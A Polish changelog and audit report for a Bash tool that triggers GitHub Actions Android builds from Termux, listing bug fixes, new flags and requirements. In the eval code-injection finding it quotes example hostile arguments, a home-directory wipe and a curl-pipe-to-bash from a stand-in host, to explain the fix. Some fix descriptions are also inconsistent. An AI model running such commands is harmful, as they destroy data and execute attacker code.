# CHANGELOG
## Smart Compile Ultimate — SecFERRO Division

> Format zgodny z [Keep a Changelog](https://keepachangelog.com/en/1.1.0/)  
> Wersjonowanie: [Semantic Versioning 2.0.0](https://semver.org/)  
> Projekt: `anonymousik.is-a.dev/scripts/scu`

---

## [3.0.0] — 2026-05-05 · FERRO IRONCLAD

# SCU v3.0 — Audit & Fix Report
### SecFERRO Division ◈ [FERRO//ANON]

---

## Krytyczne błędy naprawione (było w v2.0)

### 1. `eval` w `_retry()` — Code Injection
```bash
# ❌ v2.0 — eval z niezaufanego inputu
output=$(eval "${cmd[@]}" 2>&1) || exit_code=$?

# ✅ v3.0 — bezpieczne "$@" passing
output=$("$@" 2>&1) || exit_code=$?
```
**Ryzyko:** Każdy string w tablicy `cmd[]` był wykonywany przez `eval` —
argument zawierający `; rm -rf ~` lub `$(curl evil.sh | bash)` zostałby wykonany.
Wyeliminowane całkowicie.

---

### 2. `set -Eeuo pipefail` wykomentowany — brak detekcji błędów
```bash
# ❌ v2.0
#set -Eeuo pipefail
#IFS=$'\n\t'

# ✅ v3.0 — włączony z precyzyjnymi || true gdzie potrzeba
set -Eeuo pipefail
IFS=$'\n\t'
```
**Skutek v2.0:** Każdy błąd był cicho ignorowany. Skrypt kontynuował po `fatal`
jeśli `exit 1` nie był w głównym procesie. W v3.0 każde nieobsłużone polecenie
terminuje skrypt + loguje linię/komendę przez `trap ERR`.

---

### 3. Log rotation — empty glob expansion crash
```bash
# ❌ v2.0 — przy braku plików .log: local logs=() → array z literałem "*.log"
local logs=("$LOG_DIR"/scu_*.log)

# ✅ v3.0 — find z -print0, nullglob-safe
while IFS= read -r -d '' f; do
  logs+=("$f")
done < <(find "$LOG_DIR" -maxdepth 1 -name 'scu_*.log' -print0 | sort -z)
```
**Skutek v2.0:** Przy pierwszym uruchomieniu (brak logów) `count=1`
i skrypt próbował `gzip` na literale `~/.scu/logs/scu_*.log`.

---

### 4. Config parser — wartości z znakiem `=` obcinane
```bash
# ❌ v2.0 — IFS='=' read -r key val → WEBHOOK_URL=https://x.com?a=1&b=2 → val="https://x.com?a"
while IFS='=' read -r key val; do ...

# ✅ v3.0 — rozbicie po PIERWSZYM '=' przez parameter expansion
local key="${line%%=*}"
local val="${line#*=}"
```
**Skutek v2.0:** Każda wartość zawierająca `=` (URL webhook, JWT token,
base64 string) była obcinana po pierwszym znaku `=`.

---

### 5. Zduplikowany git-check w `_load_conf()` i `main()`
```bash
# ❌ v2.0 — sprawdzenie w _load_conf() PRZED parsowaniem --dry-run
# Powodowało fatal przy --help i --version (które nie potrzebują Git)

# ✅ v3.0 — jeden check w main(), po _parse_args(), z pomocnym komunikatem
if ! git rev-parse --is-inside-work-tree &>/dev/null; then
  echo "..."; echo "  Uruchom: git init && git remote add origin ..."; exit 1
fi
```

---

### 6. `_parse_args` — brak guard przed `shift 2` (out-of-bounds)
```bash
# ❌ v2.0
-r|--repo) REPO_NAME="$2"; shift 2 ;;
# Przy: scu.sh --repo  (bez wartości) → $2 = następna flaga lub crash

# ✅ v3.0
-r|--repo)
  (( $# > 1 )) || fatal "--repo wymaga argumentu"
  REPO_NAME="$2"; shift 2 ;;
```
Wszystkie 9 flag przyjmujących argument mają guard `(( $# > 1 ))`.

---

### 7. `--log-level` — brak walidacji wartości
```bash
# ❌ v2.0 — LOG_LEVEL="INVALID" powodował błąd w każdym wywołaniu _log_enabled()
LOG_LEVEL="${2^^}"; shift 2

# ✅ v3.0 — walidacja przez associative array
LOG_LEVEL="${2^^}"
[[ -v LOG_LEVELS[$LOG_LEVEL] ]] || fatal "Nieprawidłowy log-level: $LOG_LEVEL"
```

---

### 8. `_backoff_sleep` — division by zero przy `exp < 5`
```bash
# ❌ v2.0
local jitter=$(( RANDOM % (exp / 5 + 1) ))
# Przy exp=1: exp/5=0 → RANDOM % 1 = zawsze 0 (ale nieczytelne)
# Przy exp=0 (możliwe przy base=0): exp/5+1=1 → OK, ale exp=0 powoduje sleep 0

# ✅ v3.0
(( exp < 1 )) && exp=1
local jitter=0
if (( exp >= 5 )); then
  jitter=$(( RANDOM % (exp / 5) ))
fi
```

---

### 9. `_secret_scan` — `xargs` portability (macOS nie ma `-r`)
```bash
# ❌ v2.0 — xargs -r nie istnieje na macOS/BSD
git diff --cached --name-only | xargs -I{} grep -rlP "$pattern" -- {}

# ✅ v3.0 — iteracja po tablicy staged_files[] (null-delimited, bezpieczna)
while IFS= read -r -d '' f; do staged_files+=("$f"); done \
  < <(git diff --cached --name-only -z)
for f in "${staged_files[@]}"; do grep -qP "$pattern" "$f" && hits+=("$f"); done
```

---

### 10. `_wait_for_run` — `dispatch_time` zapisywany PO `sleep 8`
```bash
# ❌ v2.0
sleep 8
local dispatch_time; dispatch_time="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
# dispatch_time = 8 sekund PO dispatchu → filtrowało własne runy jako "zbyt stare"

# ✅ v3.0 — dispatch_time przekazywany jako parametr z _run_single_dispatch()
local dispatch_time="${2:-$(date -u +%Y-%m-%dT%H:%M:%SZ)}"
# Zapisany PRZED dispathem, sleep 8 po nim
```

---

### 11. `_generate_report` — `gh run view` na `run_id=N/A`
```bash
# ❌ v2.0 — przy SKIP_TRIGGER lub DRY_RUN: run_id="N/A" → gh api call crashował
conclusion=$(gh run view "$run_id" --json conclusion ...)

# ✅ v3.0 — guard numeryczny
if [[ "$run_id" =~ ^[0-9]+$ ]]; then
  conclusion=$(gh run view "$run_id" ...)
fi
```

---

### 12. `_trigger_workflow` — `eval` przy dispatch args
```bash
# ❌ v2.0 — dispatch_args budowane przez konkatenację string, wykonywane przez eval
if eval gh workflow run "$WORKFLOW_FILE" --ref "$BRANCH" $payload; then

# ✅ v3.0 — czysta tablica Bash, bez eval
local -a dispatch_args=(gh workflow run "$WORKFLOW_FILE" --ref "$BRANCH")
dispatch_args+=(--field "variant=$variant")
_retry "${dispatch_args[@]}"
```

---

### 13. `_monitor_execution` — brak `--exit-status` w `gh run watch`
```bash
# ❌ v2.0
gh run watch "$run_id"
# gh run watch bez --exit-status zawsze zwraca 0 nawet przy failure!

# ✅ v3.0
gh run watch "$run_id" --exit-status
# + pełny fallback polling + gh run view --log-failed | tail -150
```

---

### 14. Multi-run tracking — brak przy build matrix
```bash
# ❌ v2.0 — jeden _CURRENT_RUN_ID, matrix gubiła poprzednie run IDs
_CURRENT_RUN_ID=""

# ✅ v3.0 — tablica _RUN_IDS[]
declare -a _RUN_IDS=()
# SIGINT anuluje WSZYSTKIE aktywne runy
for rid in "${_RUN_IDS[@]}"; do gh run cancel "$rid"; done
```

---

### 15. Download — brak atomowego zapisu (partial download)
```bash
# ❌ v2.0 — pobieranie bezpośrednio do BUILD_OUTPUT_DIR
gh run download "$run_id" -n "$artifact" -D "$BUILD_OUTPUT_DIR/$artifact"
# Przy przerwaniu: częściowo pobrane pliki w finalnym miejscu

# ✅ v3.0 — atomic: temp dir → mv do final
local tmp_dest="${TEMP_DIR}/artifact_${artifact//\//_}"
gh run download ... -D "$tmp_dest" && mv "$tmp_dest" "$final_dest"
```

---

## Nowe funkcje v3.0

| Funkcja | Opis |
|---------|------|
| `_preflight()` | 10 sprawdzeń: env, bash ver, tools, gh ver, sieć, dysk, HOME, git config, jq, output dir |
| `_validate_branch()` | Weryfikacja istnienia branch w remote przed dispatch |
| `--clear-cache` flag | Przekazuje `clear-cache=true` jako workflow input |
| `--show-reports` flag | Lista ostatnich raportów JSON+TXT |
| `--retries` validation | Guard `[[ "$2" =~ ^[0-9]+$ ]]` |
| gh permissions check | `viewerPermission` — ostrzeżenie przy READ-only |
| Git user/email check | Ostrzeżenie przy nieskonf. git identity |
| Custom inputs normalizacja | Auto-konwersja non-string values na stringi (jq `tostring`) |
| `TEMP_DIR` cleanup | `mktemp` + `trap EXIT rm -rf` |
| Bash 4.0 guard | Exit 1 przy bash < 4 (associative arrays) |
| `_tee_log()` | Bezpieczny tee — fallback do `cat` gdy LOGFILE niezainicjowany |
| Workflow YAML v3 | Produkcyjny — identyczny z doc3 (validate+build+notify, SDK 34, NDK 27) |

---

## Kompatybilność

| Środowisko | Status |
|------------|--------|
| Termux (Android 7+, bash 5.x) | ✅ Pełna |
| Ubuntu 22.04+ (bash 5.x) | ✅ Pełna |
| macOS (bash 5+ przez brew) | ✅ Pełna |
| Alpine Linux (bash 5+) | ✅ Pełna |
| bash < 4.0 (macOS system bash 3.2) | ❌ Blocked — komunikat fatal |

---

## Struktura plików

```
~/.scu/
├── scu.conf                          ← config INI
├── logs/
│   ├── scu_20260505_143012_1234.log  ← aktywne (max 20)
│   └── scu_20260430_091200_5678.log.gz  ← gzip (stare)
├── locks/
│   └── scu.lock                      ← PID (auto-cleanup)
├── reports/
│   ├── scu_report_2026-05-05T14:35:00Z.json
│   └── scu_report_2026-05-05T14:35:00Z.txt
└── tmp.XXXXXX/                       ← mktemp, czyszczony przez trap
    └── artifact_neurosync-wearos-apk/  ← staging przed mv
```

---

*[FERRO//ANON] · SecFERRO Division · SCU v3.0.0 · 2026-05-05*

> Wydanie naprawcze i modernizacyjne. Wszystkie znalezione błędy krytyczne,
> portabilnościowe i logiczne zostały rozwiązane. Wprowadzono pełny workflow
> YAML z jobs `validate → build → notify`, pre-flight system oraz cross-platform
> SHA-256. Każda zmiana jest oznaczona tagiem `[FIX-XX]` bezpośrednio w kodzie.

### Bezpieczeństwo

- **[FIX-03]** Usunięto `eval "${cmd[@]}"` z `_retry()` — zastąpione przez `"$@"`.
  Poprzednia implementacja umożliwiała wstrzyknięcie dowolnego polecenia przez
  kontrolowany argument oraz niszczyła quoting argumentów zawierających spacje.
- **[FIX-05]** Przepisano `_secret_scan()` — usunięto `xargs -I{} grep -rl`:
  przy pustym stdin `xargs` uruchamiał `grep` bez pliku (skanował stdin),
  flaga `-r` na konkretnym pliku była bezużyteczna. Zastąpiono bezpieczną pętlą
  `for f in "${staged_files[@]}"` z `grep -qlP`.
- Rozszerzono wzorce secret scannera o tokeny Slack (`xox*`), GitHub OAuth
  (`gho_`) oraz generyczne klucze `secret=`.

### Naprawione błędy

- **[FIX-01]** Dodano guard na Bash 4.0+ — `declare -A` (tablice asocjacyjne)
  wymaga bash ≥ 4. Na macOS domyślny bash to 3.2; skrypt kończył się
  niezdefiniowanym zachowaniem zamiast czytelnym komunikatem.
- **[FIX-02]** Przywrócono `set -Eeuo pipefail` z precyzyjnymi wyjątkami inline
  (`|| true`, `{ cmd; } 2>/dev/null`). W v2.0 był zakomentowany bez
  żadnego obejścia, co uniemożliwiało wykrycie błędów.
- **[FIX-04]** Naprawiono jitter w `_backoff_sleep()` — przy małych wartościach
  `exp` wyrażenie `RANDOM % (exp/5)` ewaluowało do `RANDOM % 0` (dzielenie
  przez zero / UB w bash). Dodano guard: `jrange = max(exp/5, 2)`.
- **[FIX-06]** Przepisano parser INI w `_load_conf()` — `IFS='=' read -r key val`
  przy wartościach zawierających `=` (np. URL z query string
  `https://host/path?a=1`) ucinał wszystko po pierwszym znaku `=`. Zastąpiono
  `key="${line%%=*}"` / `val="${line#*=}"`.
- **[FIX-07]** Usunięto zduplikowany `git rev-parse` check z `_load_conf()` —
  weryfikacja git repo jest teraz wyłącznie w `_preflight_git()`, wywoływanym
  raz z `main()`.
- **[FIX-08]** Naprawiono rotację logów — glob `("$LOG_DIR"/scu_*.log)` bez
  plików tworzył tablicę z dosłownym stringiem `"*.log"`. Zastąpiono
  `find ... -print0 | while IFS= read -r -d ''`.
- **[FIX-09]** Zastąpiono `(( var++ ))` przez `(( ++var ))` wszędzie gdzie
  zmienna mogła mieć wartość `0`. Z aktywnym `set -e`: wyrażenie `(( 0++ ))`
  ewaluuje do `0` (falsy) → exit code 1 → natychmiastowe zakończenie skryptu.
  Dotyczyło `found++` w `_secret_scan()` oraz `polls++` w `_monitor_execution()`.
- **[FIX-10]** Dodano cross-platform `_sha256sum()` — macOS nie posiada
  `sha256sum`. Nowy fallback chain: `sha256sum → shasum -a 256 → openssl dgst -sha256`.
- **[FIX-11]** Naprawiono scope SHA-256 w `_download_artifacts()` — pętla
  `while read` wewnątrz pipe tworzy subshell; użycie `local` oraz zapis do
  pliku przeniesiono poza pipe przy użyciu process substitution (`< <(...)`).
- **[FIX-12]** Naprawiono detekcję menadżera pakietów — `pkg` w systemach
  non-Termux może oznaczać narzędzie Go/npm, nie Termux pkg. Dodano
  `_IS_TERMUX` flag; `pkg install` uruchamiany wyłącznie gdy `_IS_TERMUX=true`.
  Fallback chain: `pkg → apt-get → apk → brew`.
- **[FIX-15]** Naprawiono event-time guard w `_wait_for_run()` — `dispatch_time`
  był zapisywany PO `sleep 8`, przez co szybko zainicjowany run mógł mieć
  `createdAt` starszy niż timestamp i zostać pominięty przez filtr jq.
  Timestamp pobierany jest teraz przed `sleep`.
- **[FIX-19]** Naprawiono `_cleanup()` — `local exit_code=$?` musi być absolutnie
  pierwszą instrukcją funkcji trap. Każde polecenie wcześniej (np. `echo`) nadpisuje `$?`.

### Nowe funkcje

- **[FIX-13]** Przepisano generator workflow YAML (`.github/workflows/`) na
  podstawie produkcyjnego template:
  - Job `validate` z `outputs` (variant, cache-key) — oddzielenie walidacji
    od kompilacji
  - `concurrency` group z `cancel-in-progress: true` — eliminacja nakładających
    się runów przy push
  - `android-actions/setup-android@v3.2.1` z SDK 34, build-tools 34.0.0,
    NDK 27.0.12077973
  - Input `clear-cache` (workflow_dispatch) — czyszczenie Gradle cache na żądanie
  - `gradle/actions/wrapper-validation@v3` — weryfikacja integralności wrappera
  - Upload build logs (`if: always()`) → artefakt `build-logs-{variant}`
  - GitHub Step Summary w Markdown (variant, Java, runner, status, tail logu)
  - Job `notify` z diagnostycznymi wskazówkami debugowania przy failure
- **[FIX-14]** Dodano `_resolve_artifact_name()` — inteligentne mapowanie
  `variant → nazwa artefaktu` pasująca do YAML (`{ARTIFACT_PREFIX}-{variant}`).
  Obsługuje placeholder `{variant}` w `ARTIFACT_NAMES` oraz tryb auto z prefiksem.
- **[FIX-16]** Dodano timeout guard na `gh run watch` — bez limitu czasowego
  komenda mogła zawiesić się na czas nieokreślony. Owinięto w
  `timeout $(( MAX_WAIT_MIN * 60 ))` z fallback manual polling co 30s i twardym
  cap `MAX_WAIT_MIN` (domyślnie 60).
- **[FIX-17]** Dodano `_preflight_env()` i `_preflight_git()`:
  - Weryfikacja wersji Bash (≥ 4.0)
  - Sprawdzenie wolnego miejsca na dysku (≥ 300 MB)
  - Test łączności z `api.github.com` przez `curl --head` (nie ICMP —
    Android blokuje ping bez `CAP_NET_RAW`)
  - Detekcja środowiska Termux przez `/proc/version`, `$TERMUX_VERSION`,
    `/data/data/com.termux`
- **[FIX-18]** Dodano guard w `_generate_report()` — JSON report generowany
  tylko gdy `jq` jest dostępne; TXT report zawsze.
- **[FIX-20]** Wszystkie wywołania `gh` i `curl` owinięte w `timeout $GH_TIMEOUT_S`
  (domyślnie 30s) — zapobiega zawieszeniu przy problemach sieciowych lub
  throttlingu API.
- **[FIX-21]** Nowe flagi CLI: `--clear-cache`, `--max-wait N`,
  `--timeout N`, `--artifact-prefix`, `-f / --force` (alias dla `--force`).
- Dodano `_DISPATCHED_VARIANTS[]` — tablica śledzenia wysłanych wariantów,
  używana do automatycznego rozwiązywania nazw artefaktów w download.
- Dodano deduplikację listy artefaktów przed pobraniem.
- Rozszerzono `_self_diagnose()` o wydruk token scopes z `gh auth status`.
- `_err_trap()` wypisuje numer linii i treść polecenia przy każdym błędzie ERR.

### Zmiany łamiące kompatybilność (Breaking Changes)

- Zmienna `ARTIFACT_NAMES` zmieniła semantykę — domyślnie jest pusta;
  nazwy artefaktów są teraz auto-generowane jako `{ARTIFACT_PREFIX}-{variant}`.
  Poprzednie konfiguracje z `ARTIFACT_NAMES=neurosync-wearos-apk` wymagają
  migracji na `ARTIFACT_PREFIX=neurosync-wearos` lub jawnego `--artifacts`.
- Usunięto `ARTIFACT_NAMES` z domyślnego `scu.conf` — zastąpiono przez
  `ARTIFACT_PREFIX`.
- `_load_conf()` nie wykonuje już `git rev-parse` — skrypty wrapperowe
  wywołujące `_load_conf` bezpośrednio muszą osobno zadbać o weryfikację repo.

### Wymagania systemowe

| Zależność | Minimalna wersja | Zmiana względem v2.0 |
|-----------|-----------------|----------------------|
| `bash`    | **4.0**         | ↑ Poprzednio brak guardu |
| `git`     | 2.30+           | bez zmian |
| `gh`      | 2.40+           | bez zmian |
| `curl`    | 7.68+           | bez zmian |
| `jq`      | 1.6+            | Opcjonalne (report fallback) |
| `timeout` | GNU coreutils   | ↑ Nowe wymaganie |

---

## [2.0.0] — 2026-05-05

> Pierwsza wersja produkcyjna z pełną architekturą CI/CD.
> Refaktoryzacja z monolitycznego skryptu do modularnego systemu z
> konfiguracją, lokowaniem i pełnym parserem CLI.

### Dodane

- Lock file z PID-guard (`~/.scu/locks/scu.lock`) — blokada współbieżnych instancji
- Exponential backoff z jitter ±10% przy retry
- Rate-limit detection (HTTP 403/429) z automatycznym 60s oczekiwaniem
- Secret leak scanner — staged files grep pod 7 wzorców (AWS, GitHub PAT, OpenAI, PEM)
- Walidacja `CUSTOM_INPUTS` przez `jq empty` przed dispatch
- Smart polling `run_id` z event-time guard (`createdAt >= dispatch_time`)
- Multi-artifact download (CSV lista nazw w `ARTIFACT_NAMES`)
- Build matrix dispatch — iteracja po `BUILD_VARIANTS` (CSV)
- SHA-256 checksum po każdym pobranym artefakcie
- Config file INI (`~/.scu/scu.conf`) z auto-generacją przy pierwszym uruchomieniu
- Summary report: JSON (`~/.scu/reports/*.json`) + TXT
- Dry-run mode (`--dry-run`) — pełna symulacja bez efektów ubocznych
- Pełny parser CLI (22 flagi, aliasy krótkie `-r/-w/-b` itd.)
- Rotacja logów (max 20 plików, starsze gzip)
- Obsługa Termux:API (`termux-toast`) jako natywne powiadomienie Android
- Suggestion `gh run cancel` przy SIGINT
- Wielopoziomowy logger TRACE/DEBUG/INFO/WARN/ERROR/FATAL

### Zmienione

- Generator workflow YAML: JDK 17 → JDK 21 (temurin), `actions/upload-artifact@v3` → `v4`
- `wait_for_run`: polling z `.[0]` → filtr po `createdAt`

### Naprawione

- Brak obsługi błędów przy `gh workflow run` (brak retry w v1.0)
- Brak cleanup przy przerwaniu skryptu (SIGINT bez trap)

---

## [1.0.0] — 2026-01-10

> Pierwsza publiczna wersja. Podstawowy pipeline GitHub Actions
> uruchamiany z Termux.

### Dodane

- Podstawowy dispatch `gh workflow run` z 1 wariantem
- Prosty retry (stały `sleep 6`, bez backoff)
- Pobieranie artefaktów przez `gh run download`
- Powiadomienia Slack webhook i e-mail (placeholder)
- `gh auth login` przy braku sesji
- Auto-tworzenie repo `gh repo create --private`
- Auto-commit i push przed dispatch
- Generator workflow YAML (JDK 17, `upload-artifact@v3`)
- Kolorowe logi (INFO/WARN/ERROR/SUCCESS)
- `--help`, `AUTO_YES`, `RETRIES` przez zmienne środowiskowe

---

*[FERRO//ANON] · SecFERRO Division · `anonymousik.is-a.dev/scripts/scu` · MIT License*